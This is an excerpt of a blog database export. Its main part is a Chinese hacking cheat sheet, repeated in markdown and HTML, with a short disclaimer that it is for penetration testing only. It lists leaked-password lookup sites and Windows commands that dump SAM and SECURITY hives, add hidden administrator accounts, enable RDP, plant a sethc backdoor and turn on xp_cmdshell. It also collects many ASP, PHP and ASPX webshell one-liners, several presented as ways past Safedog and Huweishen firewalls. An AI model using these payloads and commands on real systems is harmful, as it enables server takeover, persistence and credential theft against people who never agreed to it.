notepad</p>\n<h1 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h1><p>asm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all</p>\n<h1 id=\"操作系统\"><a href=\"#操作系统\" class=\"headerlink\" title=\"操作系统\"></a>操作系统</h1><p>Unix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br><em>BSD ↔ System</em><br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian<em> → Redhat</em><br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all</p>\n<h1 id=\"IDE\"><a href=\"#IDE\" class=\"headerlink\" title=\"IDE\"></a>IDE</h1><p>Emacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0</p>\n<h1 id=\"图片\"><a href=\"#图片\" class=\"headerlink\" title=\"图片\"></a>图片</h1><p><img src=\"/content/images/chain/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/2.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/3.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/4.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/5.jpg\" alt=\"\"></p>\n<p><strong> 工具篇 </strong><br><img src=\"/content/images/chain/6.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/7.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/8.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/9.jpg\" alt=\"\"></p>\n<p><strong> 系统软件篇 </strong></p>\n<p><img src=\"/content/images/chain/10.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/11.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/12.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/13.jpg\" alt=\"\"></p>\n<p><strong> 职场篇 </strong></p>\n<p><img src=\"/content/images/chain/14.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/15.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/16.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/17.jpg\" alt=\"\"></p>\n<blockquote>\n<p>转载自：<a href=\"https://www.zhihu.com/question/24270600\" target=\"_blank\" rel=\"external\">https://www.zhihu.com/question/24270600</a></p>\n</blockquote>\n","excerpt":"<p>纯粹的一些梗，比较搞笑。来源知乎和其他网站。<br>","more":"</p>\n<h1 id=\"编辑器\"><a href=\"#编辑器\" class=\"headerlink\" title=\"编辑器\"></a>编辑器</h1><p>Emacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad</p>\n<h1 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h1><p>asm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all</p>\n<h1 id=\"操作系统\"><a href=\"#操作系统\" class=\"headerlink\" title=\"操作系统\"></a>操作系统</h1><p>Unix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br><em>BSD ↔ System</em><br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian<em> → Redhat</em><br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all</p>\n<h1 id=\"IDE\"><a href=\"#IDE\" class=\"headerlink\" title=\"IDE\"></a>IDE</h1><p>Emacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0</p>\n<h1 id=\"图片\"><a href=\"#图片\" class=\"headerlink\" title=\"图片\"></a>图片</h1><p><img src=\"/content/images/chain/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/2.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/3.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/4.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/5.jpg\" alt=\"\"></p>\n<p><strong> 工具篇 </strong><br><img src=\"/content/images/chain/6.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/7.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/8.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/9.jpg\" alt=\"\"></p>\n<p><strong> 系统软件篇 </strong></p>\n<p><img src=\"/content/images/chain/10.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/11.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/12.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/13.jpg\" alt=\"\"></p>\n<p><strong> 职场篇 </strong></p>\n<p><img src=\"/content/images/chain/14.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/15.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/16.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/17.jpg\" alt=\"\"></p>\n<blockquote>\n<p>转载自：<a href=\"https://www.zhihu.com/question/24270600\">https://www.zhihu.com/question/24270600</a></p>\n</blockquote>"},{"title":"那些Hack神器及奇技淫巧","date":"2016-09-11T22:07:28.000Z","_content":"# 简介\n这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。\n\n# 那些网站\n## 社工库\n\n### 国内\n\nhttp://www.findmima.com/\n\nhttp://www.wghostk.com/so/\n\nhttp://p.08lt.com\n\nhttp://www.144118.com/\n\n### 国际\n\nhttps://haveibeenpwned.com/\n\nhttps://leakbase.pw/\n\n## C段\nhttp://www.144118.com/\n\n## whois查询\nhttp://whois.domaintools.com/\n\n## 历史页面\n\n# 那些实用命令\n## reg导出sam\nreg save hklm\\sam sam.hive\n\nreg save hklm\\system system.hive\n\nreg save hklm\\security security.hive\n\n## Windows新建用户\nnet user admin$ admin /add\n\nnet localgroup administrators admin$ /add\n\nnet user Guest 1234\n\nnet user Guest /active:yes\n\nnet localgroup administrators Guest /add\n\n## 打开3389(2003,xp)\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n\n## sethc后门\nCopy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y\n\n## mssql xpcmdshell报错\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;\n\n# 那些一句话\n\n## asp一句话木马\n```\n<%eval request(\"x\")%>\n```\n\n## php一句话木马\n```\n<?php eval($_POST[g]);?>\n```\n\n## aspx一句话\n```\n<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"x\"],\"unsafe\");%>\n```\n\n## 数据库加密一句话(密码a)\n```\n┼攠數畣整爠煥敵瑳∨≡┩愾\n```\n\n## 网站配置、版权信息专用一句话\n```\n\"%><%Eval Request(x)%>\n```\n\n## 一句话再过护卫神\n```\n<%Y=request(\"x\")%> <%execute(Y)%>\n```\n\n## 过拦截一句话木马\n```\n<% eXEcGlOBaL ReQuEsT(\"x\") %>\n```\n\n## asp闭合型一句话 \n```\n%><%eval request(\"0o1Znz1ow\")%><%\n```\n\n## 能过安全狗的解析格式\n```\n;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg\n```\n\n## 突破安全狗的一句话\n```\n<%Y=request(\"x\")%> <%eval(Y)%>\n```\n\n## elong过安全狗的php一句话\n```\n<?php  $a = \"a\".\"s\".\"s\".\"e\".\"r\".\"t\";  $a($_POST[cc]);  ?>\n```\n\n## 后台常用写入php一句话（密码x）\n```\n<? \n $fp = @fopen(\"c.php\", 'a'); \n @fwrite($fp, '<'.'?php'.\"\\r\\n\\r\\n\".'eval($_POST[x])'.\"\\r\\n\\r\\n?\".\">\\r\\n\"); \n @fclose($fp); \n ?>\n```\n \n## 高强度php一句话\n```\n<?php substr(md5($_REQUEST['heroes']),28)=='acd0'&&eval($_REQUEST['c']);?>\n```\n\n## 新型变异PHP一句话(密码b4dboy)\n```\n($b4dboy = $_POST['b4dboy']) && @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);\n```\n\n## 突破安全狗的aspx一句话\n```\n<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>\n<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[\"你的密码\"].Value))).CreateInstance(\"c\", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>\n```\n\n## 突破护卫神，保护盾一句话\n```\n<?php $a = str_replace(x,\"\",\"axsxxsxexrxxt\");\n$a($_POST[\"test\"]); ?>\n```\n\n## PHP高强度一句话：\n```\n<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>  \n```\n\n菜刀连接：``/x.php?x=lostwolf``  脚本类型：php  密码：c\n```\n<?php assert($_REQUEST[\"c\"]);?>\n```\n\n## aspx过狗\n```\n<%@ Page Language=\"Jscript\"%><%var name:String=Request.Item[\"cmd\"];Response.Write(eval(name,\"unsafe\"));%>\n```\n\n# 那些神器\n* Sqlmap\n\n","source":"_posts/那些Hack神器及奇技淫巧.md","raw":"---\ntitle: 那些Hack神器及奇技淫巧\ndate: 2016-09-11 23:07:28\npermalink: hacktool\ntags: Hack\ncategories: Hack\n\n---\n# 简介\n这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。\n\n# 那些网站\n## 社工库\n\n### 国内\n\nhttp://www.findmima.com/\n\nhttp://www.wghostk.com/so/\n\nhttp://p.08lt.com\n\nhttp://www.144118.com/\n\n### 国际\n\nhttps://haveibeenpwned.com/\n\nhttps://leakbase.pw/\n\n## C段\nhttp://www.144118.com/\n\n## whois查询\nhttp://whois.domaintools.com/\n\n## 历史页面\n\n# 那些实用命令\n## reg导出sam\nreg save hklm\\sam sam.hive\n\nreg save hklm\\system system.hive\n\nreg save hklm\\security security.hive\n\n## Windows新建用户\nnet user admin$ admin /add\n\nnet localgroup administrators admin$ /add\n\nnet user Guest 1234\n\nnet user Guest /active:yes\n\nnet localgroup administrators Guest /add\n\n## 打开3389(2003,xp)\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n\n## sethc后门\nCopy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y\n\n## mssql xpcmdshell报错\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;\n\n# 那些一句话\n\n## asp一句话木马\n```\n<%eval request(\"x\")%>\n```\n\n## php一句话木马\n```\n<?php eval($_POST[g]);?>\n```\n\n## aspx一句话\n```\n<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"x\"],\"unsafe\");%>\n```\n\n## 数据库加密一句话(密码a)\n```\n┼攠數畣整爠煥敵瑳∨≡┩愾\n```\n\n## 网站配置、版权信息专用一句话\n```\n\"%><%Eval Request(x)%>\n```\n\n## 一句话再过护卫神\n```\n<%Y=request(\"x\")%> <%execute(Y)%>\n```\n\n## 过拦截一句话木马\n```\n<% eXEcGlOBaL ReQuEsT(\"x\") %>\n```\n\n## asp闭合型一句话 \n```\n%><%eval request(\"0o1Znz1ow\")%><%\n```\n\n## 能过安全狗的解析格式\n```\n;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg\n```\n\n## 突破安全狗的一句话\n```\n<%Y=request(\"x\")%> <%eval(Y)%>\n```\n\n## elong过安全狗的php一句话\n```\n<?php  $a = \"a\".\"s\".\"s\".\"e\".\"r\".\"t\";  $a($_POST[cc]);  ?>\n```\n\n## 后台常用写入php一句话（密码x）\n```\n<? \n $fp = @fopen(\"c.php\", 'a'); \n @fwrite($fp, '<'.'?php'.\"\\r\\n\\r\\n\".'eval($_POST[x])'.\"\\r\\n\\r\\n?\".\">\\r\\n\"); \n @fclose($fp); \n ?>\n```\n \n## 高强度php一句话\n```\n<?php substr(md5($_REQUEST['heroes']),28)=='acd0'&&eval($_REQUEST['c']);?>\n```\n\n## 新型变异PHP一句话(密码b4dboy)\n```\n($b4dboy = $_POST['b4dboy']) && @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);\n```\n\n## 突破安全狗的aspx一句话\n```\n<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>\n<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[\"你的密码\"].Value))).CreateInstance(\"c\", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>\n```\n\n## 突破护卫神，保护盾一句话\n```\n<?php $a = str_replace(x,\"\",\"axsxxsxexrxxt\");\n$a($_POST[\"test\"]); ?>\n```\n\n## PHP高强度一句话：\n```\n<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>  \n```\n\n菜刀连接：``/x.php?x=lostwolf``  脚本类型：php  密码：c\n```\n<?php assert($_REQUEST[\"c\"]);?>\n```\n\n## aspx过狗\n```\n<%@ Page Language=\"Jscript\"%><%var name:String=Request.Item[\"cmd\"];Response.Write(eval(name,\"unsafe\"));%>\n```\n\n# 那些神器\n* Sqlmap\n\n","slug":"hacktool","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xpl00415es5elpe3l57","content":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。</p>\n<h1 id=\"那些网站\"><a href=\"#那些网站\" class=\"headerlink\" title=\"那些网站\"></a>那些网站</h1><h2 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h2><h3 id=\"国内\"><a href=\"#国内\" class=\"headerlink\" title=\"国内\"></a>国内</h3><p><a href=\"http://www.findmima.com/\" target=\"_blank\" rel=\"external\">http://www.findmima.com/</a></p>\n<p><a href=\"http://www.wghostk.com/so/\" target=\"_blank\" rel=\"external\">http://www.wghostk.com/so/</a></p>\n<p><a href=\"http://p.08lt.com\" target=\"_blank\" rel=\"external\">http://p.08lt.com</a></p>\n<p><a href=\"http://www.144118.com/\" target=\"_blank\" rel=\"external\">http://www.144118.com/</a></p>\n<h3 id=\"国际\"><a href=\"#国际\" class=\"headerlink\" title=\"国际\"></a>国际</h3><p><a href=\"https://haveibeenpwned.com/\" target=\"_blank\" rel=\"external\">https://haveibeenpwned.com/</a></p>\n<p><a href=\"https://leakbase.pw/\" target=\"_blank\" rel=\"external\">https://leakbase.pw/</a></p>\n<h2 id=\"C段\"><a href=\"#C段\" class=\"headerlink\" title=\"C段\"></a>C段</h2><p><a href=\"http://www.144118.com/\" target=\"_blank\" rel=\"external\">http://www.144118.com/</a></p>\n<h2 id=\"whois查询\"><a href=\"#whois查询\" class=\"headerlink\" title=\"whois查询\"></a>whois查询</h2><p><a href=\"http://whois.domaintools.com/\" target=\"_blank\" rel=\"external\">http://whois.domaintools.com/</a></p>\n<h2 id=\"历史页面\"><a href=\"#历史页面\" class=\"headerlink\" title=\"历史页面\"></a>历史页面</h2><h1 id=\"那些实用命令\"><a href=\"#那些实用命令\" class=\"headerlink\" title=\"那些实用命令\"></a>那些实用命令</h1><h2 id=\"reg导出sam\"><a href=\"#reg导出sam\" class=\"headerlink\" title=\"reg导出sam\"></a>reg导出sam</h2><p>reg save hklm\\sam sam.hive</p>\n<p>reg save hklm\\system system.hive</p>\n<p>reg save hklm\\security security.hive</p>\n<h2 id=\"Windows新建用户\"><a href=\"#Windows新建用户\" class=\"headerlink\" title=\"Windows新建用户\"></a>Windows新建用户</h2><p>net user admin$ admin /add</p>\n<p>net localgroup administrators admin$ /add</p>\n<p>net user Guest 1234</p>\n<p>net user Guest /active:yes</p>\n<p>net localgroup administrators Guest /add</p>\n<h2 id=\"打开3389-2003-xp\"><a href=\"#打开3389-2003-xp\" class=\"headerlink\" title=\"打开3389(2003,xp)\"></a>打开3389(2003,xp)</h2><p>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>\n<h2 id=\"sethc后门\"><a href=\"#sethc后门\" class=\"headerlink\" title=\"sethc后门\"></a>sethc后门</h2><p>Copy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y</p>\n<h2 id=\"mssql-xpcmdshell报错\"><a href=\"#mssql-xpcmdshell报错\" class=\"headerlink\" title=\"mssql xpcmdshell报错\"></a>mssql xpcmdshell报错</h2><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>\n<h1 id=\"那些一句话\"><a href=\"#那些一句话\" class=\"headerlink\" title=\"那些一句话\"></a>那些一句话</h1><h2 id=\"asp一句话木马\"><a href=\"#asp一句话木马\" class=\"headerlink\" title=\"asp一句话木马\"></a>asp一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%eval request(&quot;x&quot;)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"php一句话木马\"><a href=\"#php一句话木马\" class=\"headerlink\" title=\"php一句话木马\"></a>php一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php eval($_POST[g]);?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"aspx一句话\"><a href=\"#aspx一句话\" class=\"headerlink\" title=\"aspx一句话\"></a>aspx一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"数据库加密一句话-密码a\"><a href=\"#数据库加密一句话-密码a\" class=\"headerlink\" title=\"数据库加密一句话(密码a)\"></a>数据库加密一句话(密码a)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">┼攠數畣整爠煥敵瑳∨≡┩愾</div></pre></td></tr></table></figure>\n<h2 id=\"网站配置、版权信息专用一句话\"><a href=\"#网站配置、版权信息专用一句话\" class=\"headerlink\" title=\"网站配置、版权信息专用一句话\"></a>网站配置、版权信息专用一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&quot;%&gt;&lt;%Eval Request(x)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"一句话再过护卫神\"><a href=\"#一句话再过护卫神\" class=\"headerlink\" title=\"一句话再过护卫神\"></a>一句话再过护卫神</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"过拦截一句话木马\"><a href=\"#过拦截一句话木马\" class=\"headerlink\" title=\"过拦截一句话木马\"></a>过拦截一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;% eXEcGlOBaL ReQuEsT(&quot;x&quot;) %&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"asp闭合型一句话\"><a href=\"#asp闭合型一句话\" class=\"headerlink\" title=\"asp闭合型一句话\"></a>asp闭合型一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">%&gt;&lt;%eval request(&quot;0o1Znz1ow&quot;)%&gt;&lt;%</div></pre></td></tr></table></figure>\n<h2 id=\"能过安全狗的解析格式\"><a href=\"#能过安全狗的解析格式\" class=\"headerlink\" title=\"能过安全狗的解析格式\"></a>能过安全狗的解析格式</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg</div></pre></td></tr></table></figure>\n<h2 id=\"突破安全狗的一句话\"><a href=\"#突破安全狗的一句话\" class=\"headerlink\" title=\"突破安全狗的一句话\"></a>突破安全狗的一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%eval(Y)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"elong过安全狗的php一句话\"><a href=\"#elong过安全狗的php一句话\" class=\"headerlink\" title=\"elong过安全狗的php一句话\"></a>elong过安全狗的php一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[cc]);  ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"后台常用写入php一句话（密码x）\"><a href=\"#后台常用写入php一句话（密码x）\" class=\"headerlink\" title=\"后台常用写入php一句话（密码x）\"></a>后台常用写入php一句话（密码x）</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;? </div><div class=\"line\"> $fp = @fopen(&quot;c.php&quot;, &apos;a&apos;); </div><div class=\"line\"> @fwrite($fp, &apos;&lt;&apos;.&apos;?php&apos;.&quot;\\r\\n\\r\\n&quot;.&apos;eval($_POST[x])&apos;.&quot;\\r\\n\\r\\n?&quot;.&quot;&gt;\\r\\n&quot;); </div><div class=\"line\"> @fclose($fp); </div><div class=\"line\"> ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"高强度php一句话\"><a href=\"#高强度php一句话\" class=\"headerlink\" title=\"高强度php一句话\"></a>高强度php一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php substr(md5($_REQUEST[&apos;heroes&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"新型变异PHP一句话-密码b4dboy\"><a href=\"#新型变异PHP一句话-密码b4dboy\" class=\"headerlink\" title=\"新型变异PHP一句话(密码b4dboy)\"></a>新型变异PHP一句话(密码b4dboy)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">($b4dboy = $_POST[&apos;b4dboy&apos;]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);</div></pre></td></tr></table></figure>\n<h2 id=\"突破安全狗的aspx一句话\"><a href=\"#突破安全狗的aspx一句话\" class=\"headerlink\" title=\"突破安全狗的aspx一句话\"></a>突破安全狗的aspx一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt;</div><div class=\"line\">&lt;%try&#123; System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;你的密码&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] &#123; this &#125;, null, null); &#125; catch &#123; &#125;%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"突破护卫神，保护盾一句话\"><a href=\"#突破护卫神，保护盾一句话\" class=\"headerlink\" title=\"突破护卫神，保护盾一句话\"></a>突破护卫神，保护盾一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);</div><div class=\"line\">$a($_POST[&quot;test&quot;]); ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"PHP高强度一句话：\"><a href=\"#PHP高强度一句话：\" class=\"headerlink\" title=\"PHP高强度一句话：\"></a>PHP高强度一句话：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php substr(md5($_REQUEST[&apos;x&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>\n<p>菜刀连接：<code>/x.php?x=lostwolf</code>  脚本类型：php  密码：c<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"aspx过狗\"><a href=\"#aspx过狗\" class=\"headerlink\" title=\"aspx过狗\"></a>aspx过狗</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var name:String=Request.Item[&quot;cmd&quot;];Response.Write(eval(name,&quot;unsafe&quot;));%&gt;</div></pre></td></tr></table></figure>\n<h1 id=\"那些神器\"><a href=\"#那些神器\" class=\"headerlink\" title=\"那些神器\"></a>那些神器</h1><ul>\n<li>Sqlmap</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。</p>\n<h1 id=\"那些网站\"><a href=\"#那些网站\" class=\"headerlink\" title=\"那些网站\"></a>那些网站</h1><h2 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h2><h3 id=\"国内\"><a href=\"#国内\" class=\"headerlink\" title=\"国内\"></a>国内</h3><p><a href=\"http://www.findmima.com/\">http://www.findmima.com/</a></p>\n<p><a href=\"http://www.wghostk.com/so/\">http://www.wghostk.com/so/</a></p>\n<p><a href=\"http://p.08lt.com\">http://p.08lt.com</a></p>\n<p><a href=\"http://www.144118.com/\">http://www.144118.com/</a></p>\n<h3 id=\"国际\"><a href=\"#国际\" class=\"headerlink\" title=\"国际\"></a>国际</h3><p><a href=\"https://haveibeenpwned.com/\">https://haveibeenpwned.com/</a></p>\n<p><a href=\"https://leakbase.pw/\">https://leakbase.pw/</a></p>\n<h2 id=\"C段\"><a href=\"#C段\" class=\"headerlink\" title=\"C段\"></a>C段</h2><p><a href=\"http://www.144118.com/\">http://www.144118.com/</a></p>\n<h2 id=\"whois查询\"><a href=\"#whois查询\" class=\"headerlink\" title=\"whois查询\"></a>whois查询</h2><p><a href=\"http://whois.domaintools.com/\">http://whois.domaintools.com/</a></p>\n<h2 id=\"历史页面\"><a href=\"#历史页面\" class=\"headerlink\" title=\"历史页面\"></a>历史页面</h2><h1 id=\"那些实用命令\"><a href=\"#那些实用命令\" class=\"headerlink\" title=\"那些实用命令\"></a>那些实用命令</h1><h2 id=\"reg导出sam\"><a href=\"#reg导出sam\" class=\"headerlink\" title=\"reg导出sam\"></a>reg导出sam</h2><p>reg save hklm\\sam sam.hive</p>\n<p>reg save hklm\\system system.hive</p>\n<p>reg save hklm\\security security.hive</p>\n<h2 id=\"Windows新建用户\"><a href=\"#Windows新建用户\" class=\"headerlink\" title=\"Windows新建用户\"></a>Windows新建用户</h2><p>net user admin$ admin /add</p>\n<p>net localgroup administrators admin$ /add</p>\n<p>net user Guest 1234</p>\n<p>net user Guest /active:yes</p>\n<p>net localgroup administrators Guest /add</p>\n<h2 id=\"打开3389-2003-xp\"><a href=\"#打开3389-2003-xp\" class=\"headerlink\" title=\"打开3389(2003,xp)\"></a>打开3389(2003,xp)</h2><p>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>\n<h2 id=\"sethc后门\"><a href=\"#sethc后门\" class=\"headerlink\" title=\"sethc后门\"></a>sethc后门</h2><p>Copy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y</p>\n<h2 id=\"mssql-xpcmdshell报错\"><a href=\"#mssql-xpcmdshell报错\" class=\"headerlink\" title=\"mssql xpcmdshell报错\"></a>mssql xpcmdshell报错</h2><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>\n<h1 id=\"那些一句话\"><a href=\"#那些一句话\" 